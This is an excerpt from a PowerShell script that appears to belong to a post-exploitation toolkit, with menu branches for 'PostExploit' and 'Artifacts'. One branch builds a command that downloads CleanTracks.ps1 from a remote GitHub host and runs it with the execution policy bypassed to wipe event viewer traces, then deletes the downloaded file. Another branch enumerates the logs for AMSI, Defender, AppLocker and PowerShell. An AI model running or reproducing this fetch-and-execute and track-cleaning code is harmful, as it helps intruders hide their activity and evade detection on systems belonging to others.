  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "Artifacts")
      {
         ...
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   query    Print categories             Client:User  - Privileges Required"
         ...
         If($track_choise -ieq "Paranoid") 
         {
            ...
            Write-Host " Please wait while module cleans eventvwr snapin." -ForegroundColor Blue -BackgroundColor White
            $StDoutStatus = Read-Host;If($StDoutStatus -iMatch '^(y|yes)$'){$stdout = "True"}Else{$stdout = "False"}
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1`" -OutFile `"`$Env:TMP\CleanTracks.ps1`"|Out-Null;powershell -exec bypass -File `$Env:TMP\CleanTracks.ps1 -CleanTracks Paranoid -Verb $stdout;Remove-Item -Path `$Env:TMP\CleanTracks.ps1 -EA SilentlyContinue -Force"
         }
      ...
      If($choise -ieq "ListLog" -or $choise -ieq "log")
      {
        ...
        If($logs_choise -ieq "Check" -or $logs_choise -ieq "check")
        {
          ...
          $Command = "Get-WinEvent -ListLog * -ErrorAction Ignore|Where-Object { `$_.LogName -iMatch '(AMSI|UAC|`^Application`$|DeviceGuard/Operational`$|Regsvr32/Operational`$|Windows Defender|WMI-Activity/Operational`$|AppLocker/Exe and DLL`$|AppLocker/MSI and Script`$|`^windows powershell`$|`^Microsoft-Windows-PowerShell/Operational`$|Bits-Client/Operational`$|TCPIP)'}|ft -AutoSize `> Event.txt;Get-content Event.txt;Remove-Item Event.txt -Force";
        }
